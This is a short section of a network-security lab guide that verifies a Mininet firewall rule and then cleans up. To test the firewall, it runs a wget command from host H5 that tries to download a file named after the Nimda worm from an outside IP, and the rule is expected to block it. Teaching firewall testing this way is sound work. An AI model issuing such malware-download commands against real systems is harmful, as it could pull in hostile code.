# 07 — Verification and Cleanup

## Test the Firewall

From H5:

```bash
wget 209.165.202.133:6666/W32.Nimda.Amm.exe
```

The supplied lab demonstrates that the connection should time out after the DROP rule is installed.

Stop retries if necessary:

```text
Ctrl+C
```

## Cleanup

Exit Mininet:

```text
quit
```

Then:

```bash
sudo mn -c
```

## Evidence

Save the blocked connection and cleanup screenshots under:

```text
screenshots/05-verification/
```
